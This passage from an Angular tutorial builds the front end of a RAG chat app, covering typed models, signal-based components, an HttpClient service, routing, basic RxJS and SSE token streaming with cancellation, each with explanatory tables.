9.2 The TypeScript you actually need

Not the whole language. These six things cover everything in Part 9.

Define the types that mirror your Pydantic schemas, so the compiler catches a backend contract change.

ng generate interface core/models --type=model
# or just create the file; interfaces need no scaffolding
// TypeScript mirrors of the Pydantic models in backend/app/schemas.py.
// If you change one, change the other. 9.14 shows how to test that they agree.

/** Mirrors Citation in schemas.py (section 1.3). */
export interface Citation {
  source: string;
  chunk_id: number;
  quote: string;
}

/** Mirrors Answer in schemas.py. */
export interface Answer {
  answer: string;
  confidence: number;
  citations: Citation[];
}

/** Mirrors one retrieved chunk from rag.py retrieve(). */
export interface RetrievedChunk {
  source: string;
  chunk_id: number;
  text: string;
  score: number;
  heading: string | null;
}

/** Mirrors Step in agent/loop.py (section 6.4). */
export interface AgentStep {
  n: number;
  thought: string;
  tool: string | null;
  args: Record<string, unknown> | null;
  observation: string | null;
  ok: boolean;
}

/** Every server-sent event our API can emit. A discriminated union. */
export type StreamEvent =
  | { event: 'token'; data: { text: string } }
  | { event: 'citations'; data: Citation[] }
  | { event: 'step'; data: AgentStep }
  | { event: 'approval'; data: { tool: string; args: Record<string, unknown> } }
  | { event: 'error'; data: { message: string } }
  | { event: 'done'; data: { tokens: number; seconds: number } };

/** What the UI shows for one turn. Not a backend type -- ours. */
export type MessageRole = 'user' | 'assistant';

export interface ChatMessage {
  id: string;
  role: MessageRole;
  text: string;
  streaming: boolean;
  citations: Citation[];
  steps: AgentStep[];
  error?: string;
}

export interface PendingApproval {
  tool: string;
  args: Record<string, unknown>;
}
Line(s)What it doesWhy we need it
export interface CitationDeclares a shape. Compile-time only — nothing exists at runtime.Important consequence: TypeScript does not validate JSON at runtime. If FastAPI sends a different shape, the compiler is happy and the app breaks. Pydantic validates on the server; on the client you are trusting your own API.
chunk_id: number, not chunkIdKeeps Python's snake_case.Deliberate. Matching the wire format exactly means no translation layer and no field-name bugs. Angular style guides prefer camelCase; contract fidelity wins.
heading: string | nullA union type.Mirrors Python's str | None. Now the compiler forces you to handle the null case before rendering it — a real bug caught for free.
Record<string, unknown>An object with string keys and unknown values.Tool arguments have no fixed shape. unknown rather than any: it forces a check before use, whereas any switches type checking off entirely. Prefer unknown always.
Citation[]Array type.Array<Citation> is identical; this form is conventional.
export type StreamEvent = ... | ...A discriminated union, keyed on the event field.The most valuable type in this file. In a switch (e.event), TypeScript narrows e.data to the right shape in each branch — so e.data.text is only legal under 'token'. It also makes the compiler tell you when the backend adds an event you have not handled.
export type MessageRole = 'user' | 'assistant'A union of string literals.The TypeScript equivalent of Python's Literal from section 1.2. Same job, same benefit.
streaming: boolean on ChatMessageUI state stored with the message.Lets one component render a typing indicator on the message actually streaming, rather than a global flag that lies when two things happen at once.
error?: stringOptional property.The ? means it may be absent, and the compiler makes you check. Cheaper than string | undefined to write and identical in effect.
id: stringA stable identifier per message.Needed for @for (... track m.id) in 9.3. Tracking by array index makes Angular destroy and rebuild DOM nodes as the list grows — which would restart animations and lose scroll position on every token.

The other TypeScript you will meet, in one table

FeatureExampleWhere it appears
Genericssignal<ChatMessage[]>([])Everywhere. Read it as "a signal of an array of ChatMessage".
async/awaitconst res = await fetch(url)Identical concept to Python (section 1.4). Same trap: awaiting in a loop serialises.
Optional chainingmsg.citations?.lengthReturns undefined instead of throwing when the left side is null.
Nullish coalescingheading ?? 'Untitled'Falls back only on null/undefined — unlike ||, which also fires on 0 and ''.
Non-null assertionthis.box()!.scrollTop"Trust me, this is not null." Use rarely; it silences the compiler rather than satisfying it.
readonlyreadonly messages = signal([])The reference cannot be reassigned. Standard for signals — you call .set(), you never replace the signal itself.
Try this yourself. Add | { event: 'usage'; data: { cost: number } } to StreamEvent, then look at your switch in 9.7. If you enabled strict in tsconfig.json (the CLI default) and your switch returns a value, the compiler flags the unhandled case. That is the discriminated union earning its keep: the backend contract and the frontend cannot silently diverge.

9.3 Signals, components and control flow

Build the message bubble — the smallest real component — and learn signals, inputs, control flow and styling in one file set.

ng generate component features/chat/message-bubble

That creates four files: message-bubble.ts, .html, .scss and a .spec.ts test we fill in at 9.14. On Angular 20+ there is no .component in the names.

import { Component, computed, input, output } from '@angular/core';

import { ChatMessage } from '../../core/models';

@Component({
  selector: 'app-message-bubble',
  templateUrl: './message-bubble.html',
  styleUrl: './message-bubble.scss',
})
export class MessageBubble {
  /** The message to render. Required input: the compiler enforces it. */
  readonly message = input.required<ChatMessage>();

  /** Emitted when the user clicks retry on a failed message. */
  readonly retry = output<string>();

  /** Derived state. Recomputes only when `message` changes. */
  readonly isUser = computed(() => this.message().role === 'user');
  readonly citationCount = computed(() => this.message().citations.length);
  readonly toolCount = computed(
    () => this.message().steps.filter((s) => s.tool !== null).length,
  );
  readonly isEmpty = computed(
    () => this.message().text.length === 0 && !this.message().error,
  );

  onRetry(): void {
    this.retry.emit(this.message().id);
  }
}
<article class="bubble" [class.user]="isUser()" [class.failed]="!!message().error">
  <header class="who">{{ isUser() ? 'You' : 'Second Brain' }}</header>

  @if (message().error) {
    <p class="error">{{ message().error }}</p>
    <button type="button" class="retry" (click)="onRetry()">Retry</button>
  } @else {
    <div class="text">{{ message().text }}</div>

    @if (message().streaming) {
      @if (isEmpty()) {
        <span class="thinking" aria-live="polite">Thinking</span>
      } @else {
        <span class="caret" aria-hidden="true"></span>
      }
    }
  }

  @if (!isUser() && !message().streaming) {
    <footer class="meta">
      @if (citationCount() > 0) {
        <span>{{ citationCount() }} source{{ citationCount() === 1 ? '' : 's' }}</span>
      }
      @if (toolCount() > 0) {
        <span>{{ toolCount() }} tool call{{ toolCount() === 1 ? '' : 's' }}</span>
      }
    </footer>
  }
</article>
.bubble {
  max-width: 46rem;
  padding: 0.75rem 1rem;
  margin: 0.5rem 0;
  border: 1px solid var(--line, #dcdfe4);
  border-radius: 10px;
  background: #fff;

  &.user {
    background: #f3f5f9;
    margin-left: auto;
  }

  &.failed {
    border-color: #c0392b;
  }
}

.who {
  font-size: 0.75rem;
  font-weight: 600;
  color: #5b6472;
  margin-bottom: 0.25rem;
}

.text {
  white-space: pre-wrap;   // keeps model line breaks without a markdown pass
  line-height: 1.6;
}

.error {
  color: #c0392b;
  margin: 0 0 0.5rem;
}

.caret {
  display: inline-block;
  width: 0.5rem;
  height: 1rem;
  margin-left: 2px;
  background: #2f4bd8;
  vertical-align: text-bottom;
  animation: blink 1s step-end infinite;
}

.thinking::after {
  content: '…';
  animation: blink 1.2s step-end infinite;
}

@keyframes blink {
  50% { opacity: 0; }
}

@media (prefers-reduced-motion: reduce) {
  .caret, .thinking::after { animation: none; }
}

.meta {
  display: flex;
  gap: 0.75rem;
  margin-top: 0.5rem;
  font-size: 0.75rem;
  color: #5b6472;
}
Line(s)What it doesWhy we need it
@Component({...})A decorator marking the class as a component and pointing at its template and styles.Note there is no standalone: true — it is the default from v19. Older tutorials include it; harmless either way.
selector: 'app-message-bubble'The tag other templates use: <app-message-bubble>.The app- prefix is convention and avoids clashing with real HTML elements.
templateUrl / styleUrlSeparate files rather than inline strings.Note styleUrl singular (v17+); older code uses styleUrls: []. Both work; the CLI generates the modern one.
input.required<ChatMessage>()Declares a required input as a signal (v17.1+).Read it as this.message(). "Required" means the compiler errors if a parent forgets to pass it — the old @Input() decorator could not do that.
output<string>()Declares an event the parent can listen to.Data flows down through inputs, events flow up through outputs. Emitting the message id rather than the object keeps the contract narrow.
computed(() => ...)Derived values that recompute only when their inputs change.No dependency array: Angular records which signals you read. Putting this logic in computed rather than in the template keeps the template readable and means it is calculated once, not on every change-detection pass.
readonly on every signalThe signal reference cannot be reassigned.You mutate the value with .set(), never the signal itself. This is idiomatic and prevents a whole class of confusing bug.
[class.user]="isUser()"Conditionally applies a CSS class.Preferred over [ngClass], which is now soft-deprecated in favour of this form.
[class.failed]="!!message().error"Coerces to boolean with !!.error is string | undefined; the binding wants a boolean.
@if (...) { } @else { }Built-in control flow (v17+).Compiles to efficient instructions with no directive import. Older tutorials use *ngIf plus <ng-template #else>, which is much worse to read.
nested @if for thinking vs caretShows "Thinking…" before the first token, then a blinking caret.The UX detail that makes streaming feel fast. Section 3.5 measured 0.41s to first token; this fills that gap with something honest.
aria-live="polite"Announces the status to screen readers.Streaming text is invisible to assistive technology unless you say so. Do not skip this; it is two attributes.
{{ count }} source{{ count === 1 ? '' : 's' }}Interpolation with an expression.Template expressions are a restricted subset of JavaScript — no assignments, no new. Keep anything complicated in a computed.
white-space: pre-wrapPreserves newlines from the model.Without it, an LLM's carefully formatted list renders as one paragraph. This is the cheap version; 9.8 does markdown properly.
&.user { } nestingSCSS nesting with the parent selector.Compiles to .bubble.user. The main reason we chose SCSS in section 0.9.
@media (prefers-reduced-motion: reduce)Disables the blinking animations.A blinking caret is genuinely unpleasant for some people. One media query.
styles are component-scopedAngular rewrites selectors so .text only applies inside this component.No BEM naming discipline needed, and no global leakage. One of Angular's quietly excellent features.

Expected result

Nothing renders yet — no parent uses this component. After 9.5 you will see: a right-aligned grey bubble for your message, a left-aligned white one for the answer, "Thinking…" until the first token arrives, then a blinking caret while text streams, then a footer reading "2 sources · 3 tool calls". A failed message shows red text and a Retry button.

The zoneless gotcha, and it will bite you in 9.7. Angular used to patch every browser API through zone.js so it could notice when anything changed. From v21 new projects are zoneless by default, and v22 makes OnPush the default change detection. The practical rule:

  • Update state through signals and everything just works, including from a fetch callback, a setTimeout, or a stream reader.
  • Update a plain class field and the UI will not update. No error, no warning, just a stale screen. This is the single most confusing bug for someone arriving from older Angular.

So: if a value is shown in a template, it is a signal. Not sometimes — always.

Common errors and how to fix them
ErrorCauseFix
Template shows [object Object] or nothingYou wrote {{ message }} instead of {{ message() }}.Signals are functions. Call them. The Angular Language Service extension (section 0.6) flags this in the editor.
NG0950: Input is required but no value is available yetReading a required input too early — for example in a field initialiser or the constructor.Read required inputs inside computed, effect, or ngOnInit, never at construction time.
'app-message-bubble' is not a known elementThe parent did not import the component.Standalone components must be listed in the parent's imports: [MessageBubble]. There is no NgModule to do it for you.
UI does not update when data changesPlain field instead of a signal — the zoneless trap above.Convert it to a signal. If you must keep a field, inject ChangeDetectorRef and call markForCheck(); prefer the signal.
Styles leak or do not applyExpecting global CSS behaviour.Component styles are scoped. For genuinely global rules use src/styles.scss.
Try this yourself. Change isUser from a computed to a plain method isUser() { return this.message().role === 'user'; }. It still works — but now it runs on every change-detection pass instead of only when the message changes. With one bubble that is invisible; with 200 bubbles and a token arriving 60 times a second it is not. That is the argument for computed in one experiment.

9.4 Services, HttpClient, and typed responses

A service is where everything that is not rendering lives. Components should read signals and emit events; services should talk to the network and own state.

Register HttpClient, then build the service method for a non-streaming answer, fully typed against the Pydantic schema.

import { ApplicationConfig, provideBrowserGlobalErrorListeners } from '@angular/core';
import { provideHttpClient, withFetch } from '@angular/common/http';
import { provideRouter } from '@angular/router';

import { routes } from './app.routes';

export const appConfig: ApplicationConfig = {
  providers: [
    provideBrowserGlobalErrorListeners(),
    provideRouter(routes),
    provideHttpClient(withFetch()),
  ],
};
Line(s)What it doesWhy we need it
ApplicationConfigThe standalone replacement for the old root NgModule.Everything application-wide is a provider function here. There is no AppModule in a modern project.
provideHttpClient(withFetch())Makes HttpClient injectable, backed by the fetch API rather than XMLHttpRequest.withFetch() matters for us: it is required for HTTP response streaming through HttpClient, and it is the modern default direction. ⚠ Some recent versions may provide HttpClient without an explicit call — including it is harmless and portable.
provideRouter(routes)Registers the route table from 9.12.Generated for you by ng new --routing.
provideBrowserGlobalErrorListeners()Reports uncaught errors and promise rejections through Angular's error handler.⚠ Recent CLI versions scaffold this. If your generated file does not have it, do not add it blindly — check your version's template.
 
ng generate service core/chat
import { HttpClient, HttpErrorResponse } from '@angular/common/http';
import { Injectable, inject, signal } from '@angular/core';
import { catchError, throwError, timeout } from 'rxjs';

import { environment } from '../../environments/environment';
import { Answer, ChatMessage, RetrievedChunk } from './models';

interface AskResponse {
  answer: Answer;
  chunks: RetrievedChunk[];
}

@Injectable({ providedIn: 'root' })
export class ChatService {
  private readonly http = inject(HttpClient);
  private readonly base = environment.apiBase;

  /** The conversation. The single source of truth for the whole UI. */
  readonly messages = signal<ChatMessage[]>([]);
  readonly busy = signal(false);

  private newId(): string {
    return crypto.randomUUID();
  }

  addUserMessage(text: string): ChatMessage {
    const message: ChatMessage = {
      id: this.newId(), role: 'user', text,
      streaming: false, citations: [], steps: [],
    };
    this.messages.update((list) => [...list, message]);
    return message;
  }

  private addAssistantPlaceholder(): ChatMessage {
    const message: ChatMessage = {
      id: this.newId(), role: 'assistant', text: '',
      streaming: true, citations: [], steps: [],
    };
    this.messages.update((list) => [...list, message]);
    return message;
  }

  private patch(id: string, changes: Partial<ChatMessage>): void {
    this.messages.update((list) =>
      list.map((m) => (m.id === id ? { ...m, ...changes } : m)),
    );
  }

  /** Ask a question and wait for the whole answer. M16. */
  ask(question: string): void {
    this.addUserMessage(question);
    const placeholder = this.addAssistantPlaceholder();
    this.busy.set(true);

    this.http
      .post<AskResponse>(`${this.base}/api/ask`, { question })
      .pipe(
        timeout(120_000),
        catchError((err: HttpErrorResponse) => {
          this.patch(placeholder.id, {
            streaming: false,
            error: this.describe(err),
          });
          this.busy.set(false);
          return throwError(() => err);
        }),
      )
      .subscribe((response) => {
        this.patch(placeholder.id, {
          text: response.answer.answer,
          citations: response.answer.citations,
          streaming: false,
        });
        this.busy.set(false);
      });
  }

  private describe(err: HttpErrorResponse): string {
    if (err.status === 0) {
      return 'Cannot reach the API. Is the backend running on ' + this.base + '?';
    }
    if (err.status === 429) return 'Rate limited. Wait a moment and retry.';
    if (err.status >= 500) return `Server error (${err.status}). Check the API logs.`;
    return err.error?.detail ?? `Request failed (${err.status}).`;
  }
}
Line(s)What it doesWhy we need it
@Injectable({ providedIn: 'root' })Registers the service as an application-wide singleton.Every component that injects ChatService gets the same instance, so the message list is shared automatically. This is the DI point from 9.1, doing real work.
private readonly http = inject(HttpClient)The inject() function (v14+).Preferred over constructor parameters now: shorter, works in field initialisers, and composes better. Older tutorials use constructor(private http: HttpClient); both work.
environment.apiBaseReads the API URL from an environment file.Never hardcode http://localhost:8000. 9.12 sets these up so a production build points somewhere else.
readonly messages = signal<ChatMessage[]>([])The conversation, in a signal, in the service.The core architectural decision. State lives in the service; components read it. This is what makes the citations panel and trace viewer trivially able to show data for the message the chat is streaming.
this.messages.update((list) => [...list, message])Replaces the array with a new one.Signals compare by reference. list.push(m) mutates in place, the reference is unchanged, and nothing re-renders. This is the second most common signals bug after forgetting the parentheses.
patch(id, changes: Partial<ChatMessage>)Immutably updates one message by id.Partial<T> makes every property optional, so callers pass only what changed. One helper used by every update path, including the streaming one in 9.7.
crypto.randomUUID()A unique id from the browser.No library needed. Feeds track in 9.5. Note it requires a secure context — fine on localhost and HTTPS.
this.http.post<AskResponse>(...)A typed POST returning an Observable.The generic is a promise about the shape, not a check — see 9.2's warning. It gives you autocomplete and compile errors, which is worth having.
.pipe(timeout(120_000), catchError(...))Operators applied to the stream of results.Section 1.10's rule holds on the client too: never make a request without a timeout. 120 seconds because a local model is slow.
.subscribe(...)Actually sends the request.An Angular HttpClient observable is lazy. No subscribe, no request — and no error, which makes it a genuinely puzzling bug the first time.
err.status === 0Detects "no response at all".Status 0 means the request never completed: server down, DNS failure, or — very commonly in development — CORS. See 9.12.
err.error?.detail ?? ...Reads FastAPI's error body, falling back to a generic message.FastAPI puts messages in detail. Optional chaining and nullish coalescing from 9.2, doing something useful.
describe() as a separate methodTurns HTTP failures into human sentences."Cannot reach the API. Is the backend running?" saves you and your users real time. Section 7.9 listed error states as something the prototype tools hand you; this is you writing it.
Common errors and how to fix them
ErrorCauseFix
Nothing happens, no network request in devtoolsYou never subscribed.Add .subscribe(), or use toSignal()/httpResource() which subscribe for you.
NullInjectorError: No provider for HttpClientprovideHttpClient() missing from app.config.ts.Add it. In tests, use provideHttpClientTesting() (9.14).
UI does not update after the response arrivesmessages mutated with push.Always produce a new array. Consider freezing in development to catch it.
Requests fire twiceSubscribed twice, or the observable is used in a template with a pipe as well.Subscribe once. HttpClient observables are cold — each subscription is a new request.

9.5 M16 — a working chat page

Wire the service to a page with a composer and a message list, and have a real conversation with your backend.

ng generate component features/chat/chat
import { Component, computed, inject, signal } from '@angular/core';

import { ChatService } from '../../core/chat.service';
import { MessageBubble } from './message-bubble';

@Component({
  selector: 'app-chat',
  imports: [MessageBubble],
  templateUrl: './chat.html',
  styleUrl: './chat.scss',
})
export class Chat {
  private readonly chat = inject(ChatService);

  readonly messages = this.chat.messages;
  readonly busy = this.chat.busy;
  readonly draft = signal('');

  readonly canSend = computed(
    () => this.draft().trim().length > 0 && !this.busy(),
  );

  send(): void {
    if (!this.canSend()) return;
    this.chat.ask(this.draft().trim());
    this.draft.set('');
  }

  onKeydown(event: KeyboardEvent): void {
    if (event.key === 'Enter' && !event.shiftKey) {
      event.preventDefault();
      this.send();
    }
  }

  onRetry(id: string): void {
    const failed = this.messages().find((m) => m.id === id);
    const question = this.previousUserText(id);
    if (failed && question) {
      this.chat.messages.update((list) => list.filter((m) => m.id !== id));
      this.chat.ask(question);
    }
  }

  private previousUserText(assistantId: string): string | null {
    const list = this.messages();
    const index = list.findIndex((m) => m.id === assistantId);
    for (let i = index - 1; i >= 0; i--) {
      if (list[i].role === 'user') return list[i].text;
    }
    return null;
  }
}
<section class="page">
  <div class="stream">
    @for (message of messages(); track message.id) {
      <app-message-bubble [message]="message" (retry)="onRetry($event)" />
    } @empty {
      <p class="empty">Ask a question about your indexed documents.</p>
    }
  </div>

  <div class="composer">
    <textarea
      rows="2"
      placeholder="Ask Second Brain…  (Enter to send, Shift+Enter for a new line)"
      [value]="draft()"
      (input)="draft.set($any($event.target).value)"
      (keydown)="onKeydown($event)"
      [disabled]="busy()"
      aria-label="Your question"></textarea>

    <button type="button" (click)="send()" [disabled]="!canSend()">
      {{ busy() ? 'Working…' : 'Send' }}
    </button>
  </div>
</section>
.page {
  display: flex;
  flex-direction: column;
  height: 100%;
  max-width: 52rem;
  margin: 0 auto;
}

.stream {
  flex: 1;
  overflow-y: auto;
  padding: 1rem 1rem 0;
}

.empty {
  color: #5b6472;
  text-align: center;
  margin-top: 3rem;
}

.composer {
  display: flex;
  gap: 0.5rem;
  align-items: flex-end;
  padding: 1rem;
  border-top: 1px solid #dcdfe4;
  background: #fff;

  textarea {
    flex: 1;
    resize: vertical;
    font: inherit;
    padding: 0.5rem 0.75rem;
    border: 1px solid #dcdfe4;
    border-radius: 8px;
  }

  button {
    font: inherit;
    padding: 0.55rem 1.1rem;
    border: 1px solid #2f4bd8;
    border-radius: 8px;
    background: #2f4bd8;
    color: #fff;
    cursor: pointer;

    &:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
  }
}
Line(s)What it doesWhy we need it
imports: [MessageBubble]Declares the child component this template uses.Standalone components import what they use directly. Forget this and you get "not a known element" — a silent no-op in the browser, an error at build.
readonly messages = this.chat.messagesRe-exposes the service's signal.Not a copy — the same signal object. The template reads it and updates when the service changes it, with no glue code at all.
readonly draft = signal('')Local UI state stays local.Draft text does not belong in the shared service. Keep component-only state in the component.
canSend = computed(...)Disables sending on empty input or while busy.Both the button's disabled and send()'s guard read the same expression, so they cannot disagree.
@for (... track message.id)Renders the list, keyed by id.track is mandatory and it matters here. With track $index, appending a message re-keys later items and Angular rebuilds DOM nodes — restarting the caret animation and breaking scroll position on every token.
@empty { }Renders when the list is empty (v17+).Built in, so no @if (messages().length === 0) alongside the loop. Section 7.9 called an empty screen an invitation to act; this is it.
[message]="message"Passes the input.Square brackets mean "evaluate this as an expression". Without them you would pass the literal string "message".
(retry)="onRetry($event)"Listens to the child's output.Parentheses mean event binding. $event is whatever the child emitted — the message id.
<app-message-bubble ... />Self-closing custom element tag.Allowed in Angular templates (v15.1+), even though plain HTML forbids it for non-void elements.
(input)="draft.set($any($event.target).value)"Two-way-ish binding by hand.$any() silences the compiler about EventTarget not having .value. Slightly ugly, and honest about what is happening. [(ngModel)] is the alternative and needs FormsModule; ⚠ v22 also stabilised Signal Forms, which is the modern route for anything larger than one textarea.
onKeydown with !event.shiftKeyEnter sends, Shift+Enter makes a newline.The convention every chat UI uses. preventDefault() stops the newline being inserted as well as sending.
onRetry finding the previous user messageRemoves the failed bubble and re-asks the original question.Retry has to know what to retry. Walking backwards for the nearest user turn is the simple correct approach — and it is why messages carry ids.
overflow-y: auto on .streamMakes the message area the scroll container.Deliberate: the composer stays pinned. 9.9 attaches autoscroll to exactly this element.
aria-label on the textareaNames the field for screen readers.A placeholder is not a label — it disappears as soon as you type.

Wire it into the app shell and run it

import { Routes } from '@angular/router';

export const routes: Routes = [
  { path: '', redirectTo: 'chat', pathMatch: 'full' },
  { path: 'chat', loadComponent: () => import('./features/chat/chat').then((m) => m.Chat) },
  {
    path: 'documents',
    loadComponent: () =>
      import('./features/documents/documents').then((m) => m.Documents),
  },
  { path: '**', redirectTo: 'chat' },
];
<header class="top">
  <strong>Second Brain</strong>
  <nav>
    <a routerLink="/chat" routerLinkActive="active">Chat</a>
    <a routerLink="/documents" routerLinkActive="active">Documents</a>
  </nav>
</header>

<main>
  <router-outlet />
</main>
import { Component } from '@angular/core';
import { RouterLink, RouterLinkActive, RouterOutlet } from '@angular/router';

@Component({
  selector: 'app-root',
  imports: [RouterOutlet, RouterLink, RouterLinkActive],
  templateUrl: './app.html',
  styleUrl: './app.scss',
})
export class App {}
Line(s)What it doesWhy we need it
loadComponent: () => import(...)Lazy loading. The component's code is fetched only when the route is visited.Free performance: the documents page and its upload code are not in the initial bundle. See 9.13.
.then((m) => m.Chat)Picks the exported class from the module.Needed because we use a named export. A default export would let you drop the .then.
{ path: '**', redirectTo: 'chat' }Catch-all for unknown URLs.Must be last — the router matches in order. A 404 component is the better long-term answer.
<router-outlet />Where the routed component renders.The one placeholder the shell needs.
routerLinkActive="active"Adds a class to the link for the current route.Navigation highlighting without any code.

Expected result

$ npm start
  ➜  Local:   http://localhost:4200/
Application bundle generation complete. [1.8 seconds]

# In the browser at /chat:
#   "Ask a question about your indexed documents."
#   Type a question, press Enter.
#   Your text appears right-aligned; an empty assistant bubble shows "Thinking…"
#   After a few seconds the full answer replaces it, with "1 source" underneath.

It will not work yet, and the reason is instructive. There is no /api/ask endpoint — that is Part 10, M15 — and even once there is, the browser will block the request because it is a cross-origin call from port 4200 to port 8000. You will see status 0 and the message your describe() method writes. Section 9.12 fixes CORS properly on both sides. To see the UI working now, temporarily point ask() at a fake: setTimeout(() => this.patch(placeholder.id, { text: 'Hello from a stub.', streaming: false }), 800).

M16 is done once the stub renders. git commit -m "M16: Angular chat shell, service layer and non-streaming chat".

Try this yourself. Change track message.id to track $index, add a CSS transition to .bubble, and send three messages. Every existing bubble re-animates each time a new one arrives, because Angular is rebuilding them. Change it back. You have just seen exactly what track is for.

9.6 Just enough RxJS

RxJS is a large library for working with streams of values over time. You need six pieces of it, and modern Angular lets you avoid most of the rest.

PieceWhat it isWhere you use it
ObservableA stream of zero or more values over time, that you must subscribe to.Every HttpClient method returns one.
subscribe()Starts it and receives values.9.4. Remember: no subscribe, no request.
mapTransforms each value.Reshaping an API response before it reaches a component.
switchMapFor each incoming value, start a new inner stream and cancel the previous one.Type-ahead search over your documents: the user types "olla", then "ollam" — you want the second request and not the first.
takeUntilDestroyed()Unsubscribes automatically when the component is destroyed (v16+).Every long-lived subscription. The modern replacement for a manual takeUntil(this.destroy$) pattern.
toSignal()Converts an observable into a signal.The bridge between RxJS and the signal world. Also unsubscribes for you.

Memory leaks, and how to not have them

A subscription that outlives its component keeps the component alive and keeps reacting. For HttpClient this rarely matters — the observable completes after one response, which unsubscribes automatically. It matters for anything that does not complete: router events, a valueChanges stream, an interval, a WebSocket.

import { takeUntilDestroyed } from '@angular/core/rxjs-interop';
import { Component, inject, signal } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { Subject, debounceTime, distinctUntilChanged, switchMap } from 'rxjs';

import { environment } from '../../environments/environment';
import { RetrievedChunk } from '../../core/models';

@Component({ selector: 'app-doc-search', template: '' })
export class DocSearch {
  private readonly http = inject(HttpClient);
  private readonly typed = new Subject<string>();

  readonly results = signal<RetrievedChunk[]>([]);

  constructor() {
    this.typed
      .pipe(
        debounceTime(250),
        distinctUntilChanged(),
        switchMap((q) =>
          this.http.get<RetrievedChunk[]>(
            `${environment.apiBase}/api/search`, { params: { q } },
          ),
        ),
        takeUntilDestroyed(),
      )
      .subscribe((hits) => this.results.set(hits));
  }

  onType(value: string): void {
    this.typed.next(value);
  }
}
Line(s)What it doesWhy we need it
new Subject<string>()An observable you can push values into.The bridge from an imperative event handler into a reactive pipeline.
debounceTime(250)Waits for 250 ms of quiet before emitting.Turns eight keystrokes into one request. The cheapest possible protection for your retrieval endpoint.
distinctUntilChanged()Ignores a repeated identical value.Stops a request when the user types a character and deletes it.
switchMapCancels the in-flight request when a new query arrives.The important one. With mergeMap you get every response in arbitrary order and the UI flickers between stale results. Use switchMap for anything where only the latest matters.
takeUntilDestroyed()Ties the subscription's lifetime to the component's.Must be called in an injection context — the constructor or a field initialiser. Elsewhere, pass a DestroyRef explicitly.
.subscribe((hits) => this.results.set(hits))Pushes results into a signal.The pattern to internalise: RxJS at the edges, signals in the app. Components read signals; RxJS handles the awkward timing problems.

What to skip. You do not need combineLatest, mergeMap, shareReplay, higher-order observable theory, or the marble diagrams. Modern Angular answers most of those with computed and, from v22, the stable resource and httpResource APIs ⚠ which give you loading/error/value as signals without writing a pipeline at all. Learn the six above, reach for httpResource for straightforward reads, and only go deeper when a real problem demands it.

9.7 M17 — token-by-token streaming, with cancel

The section that matters most. Section 3.5 measured 0.41 seconds to first token against 4.87 seconds total; this is where the user gets to feel that difference.

Two transports, and how to choose

EventSourcefetch + ReadableStream
HTTP methodGET only.Anything, including POST.
Custom headersNo. No Authorization header.Yes.
Request bodyNo — your question must fit in the URL.Yes, a normal JSON body.
Auto-reconnectYes, built in, with Last-Event-ID.No. You write it if you want it.
Cancellationsource.close().AbortController.abort(), which also aborts the HTTP request itself.
Event parsingDone for you: onmessage, addEventListener('token').You parse the SSE framing yourself.
Verdict for our appFine for a simple GET feed. Blocked by the header and POST limits.What we use. A chat question wants a POST body, and later an auth header.

Rule of thumb. EventSource for a server-push feed you did not initiate — notifications, job status. fetch + ReadableStream for a request/response exchange you started, which is what chat is. I show both, because you will meet both, and the EventSource version is 12 lines.

The SSE wire format, so the parser makes sense

event: token
data: {"text":"Retrieval "}

event: token
data: {"text":"augmented "}

: keep-alive

event: citations
data: [{"source":"setup.md","chunk_id":4}]

event: done
data: {"tokens":63,"seconds":4.9}

Events are separated by a blank line. Each event has an optional event: name and one or more data: lines. A line starting with : is a comment, used as a keep-alive so proxies do not close an idle connection.

The bug that catches everyone. Network chunks have nothing to do with event boundaries. A single read() may give you half an event, or three and a half events. If you split each chunk independently you will corrupt the stream — and it will work fine in local testing, because a fast localhost connection often delivers whole events. You must buffer across chunks. The code below does, and the output verifies it.

Add streaming and cancellation to the chat service.

  /** Aborts the in-flight generation. Null when nothing is streaming. */
  private controller: AbortController | null = null;

  readonly streaming = signal(false);
  readonly pendingApproval = signal<PendingApproval | null>(null);

  /** M17: ask, and render tokens as they arrive. */
  async askStreaming(question: string): Promise<void> {
    this.addUserMessage(question);
    const target = this.addAssistantPlaceholder();

    this.controller = new AbortController();
    this.busy.set(true);
    this.streaming.set(true);

    try {
      const response = await fetch(`${this.base}/api/chat/stream`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Accept: 'text/event-stream' },
        body: JSON.stringify({ question }),
        signal: this.controller.signal,
      });

      if (!response.ok || !response.body) {
        throw new Error(`HTTP ${response.status}`);
      }

      const reader = response.body.pipeThrough(new TextDecoderStream()).getReader();
      let buffer = '';

      while (true) {
        const { value, done } = await reader.read();
        if (done) break;

        buffer += value;
        let boundary: number;
        while ((boundary = buffer.indexOf('\n\n')) !== -1) {
          const raw = buffer.slice(0, boundary);
          buffer = buffer.slice(boundary + 2);
          const event = this.parseSseEvent(raw);
          if (event) this.applyEvent(target.id, event);
        }
      }

      if (buffer.trim()) {
        const event = this.parseSseEvent(buffer);
        if (event) this.applyEvent(target.id, event);
      }

      this.patch(target.id, { streaming: false });
    } catch (err) {
      const aborted = err instanceof DOMException && err.name === 'AbortError';
      this.patch(target.id, {
        streaming: false,
        error: aborted ? undefined : this.describeStreamError(err),
      });
    } finally {
      this.controller = null;
      this.busy.set(false);
      this.streaming.set(false);
    }
  }

  /** Stop generation. The server sees the connection close and stops too. */
  cancel(): void {
    this.controller?.abort();
  }

  private parseSseEvent(raw: string): StreamEvent | null {
    let name = 'message';
    const dataLines: string[] = [];

    for (const line of raw.split('\n')) {
      if (line.startsWith(':')) continue;
      if (line.startsWith('event:')) name = line.slice(6).trim();
      else if (line.startsWith('data:')) dataLines.push(line.slice(5).replace(/^ /, ''));
    }
    if (dataLines.length === 0) return null;

    try {
      return { event: name, data: JSON.parse(dataLines.join('\n')) } as StreamEvent;
    } catch {
      return null;
    }
  }

  private applyEvent(id: string, event: StreamEvent): void {
    switch (event.event) {
      case 'token':
        this.messages.update((list) =>
          list.map((m) =>
            m.id === id ? { ...m, text: m.text + event.data.text } : m,
          ),
        );
        break;
      case 'citations':
        this.patch(id, { citations: event.data });
        break;
      case 'step':
        this.messages.update((list) =>
          list.map((m) =>
            m.id === id ? { ...m, steps: [...m.steps, event.data] } : m,
          ),
        );
        break;
      case 'approval':
        this.pendingApproval.set(event.data);
        break;
      case 'error':
        this.patch(id, { error: event.data.message, streaming: false });
        break;
      case 'done':
        this.patch(id, { streaming: false });
        break;
    }
  }

  private describeStreamError(err: unknown): string {
    if (err instanceof TypeError) {
      return `Cannot reach the API at ${this.base}. Is the backend running, and is CORS configured?`;
    }
